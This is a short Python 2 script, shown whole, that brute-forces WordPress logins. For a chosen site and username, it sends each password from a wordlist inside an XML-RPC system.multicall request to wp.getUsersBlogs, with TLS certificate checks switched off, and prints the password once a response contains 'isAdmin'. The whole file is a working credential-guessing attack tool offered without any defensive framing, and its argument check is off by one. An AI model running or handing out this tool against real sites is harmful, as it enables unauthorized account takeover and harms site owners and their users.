#!/usr/bin/python
'''

'''
from __future__ import print_function

import urllib2
import sys
import ssl

if __name__ == '__main__':
    if len(sys.argv) < 3: exit('Error: not enough arguments. Usage...')

    url = sys.argv[1]
    pwfile = sys.argv[2]
    user = sys.argv[3]

    # read in list of passwords
    with open(pwfile, 'r') as f:
        pwlist = f.read().splitlines()

    # construct XML for RPC POST request
    for pw in pwlist:
        data = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>" % (user, pw)

        # create SSL request if needed
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        header = 'headers={"Content-Type": "application/xml"}'

        # post request
        try:
            req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
            rsp = urllib2.urlopen(req,context=ctx)
        except urllib2.HTTPError as e:
            print(e.code)
        except urllib2.URLError as e:
            print(e.reason)
        else:
            content = rsp.read()

            # checks for either 'Incorrect' or 'isAdmin' keywords
            # note that the isAdmin does not ensure that the user
            # is a wordpress admin... the boolean flag might be 0
            if 'Incorrect' in content:
                print('.', end='')
                sys.stdout.flush()
            elif 'isAdmin' in content:
                print("\nPassword found for user: \n\t - username: %s\n\t - password: %s" % (user,pw))
                exit()

